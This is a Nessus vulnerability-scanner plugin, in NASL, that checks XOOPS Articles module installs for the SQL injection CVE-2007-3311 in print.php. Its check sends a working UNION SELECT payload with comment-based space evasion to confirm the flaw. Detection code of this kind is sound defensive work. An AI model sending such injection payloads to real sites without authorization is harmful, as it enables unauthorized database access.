#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(24902);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-3311");
  script_bugtraq_id(23160);

  script_name(english:"XOOPS Articles Module print.php id Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running the Articles module, a third-party module
for XOOPS. 

The version of this module installed on the remote host fails to
properly sanitize user-supplied input to the 'id' parameter of the
'modules/articles/print.php' script before using it to build a
database query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated, remote attacker can leverage this issue to launch SQL
injection attacks against the affected application, leading to
discovery of sensitive information, attacks against the underlying
database, and the like.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/463916/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://support.sirium.net/modules/mydownloads/viewcat.php?cid=2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Articles module version 1.03 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/03/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/03/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:xoops:articles_module");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_require_keys("www/xoops");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to manipulate the title in a list of "cards".
  magic = unixtime();
  exploit = string("-1 UNION SELECT NULL,NULL,NULL,NULL,NULL,", magic, ",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/modules/articles/print.php?",
      "id=", exploit
    ));
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if we managed to set the description based on our magic.
  if (
    "First posted" >< res &&
    string("<td>", magic, "</td>") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
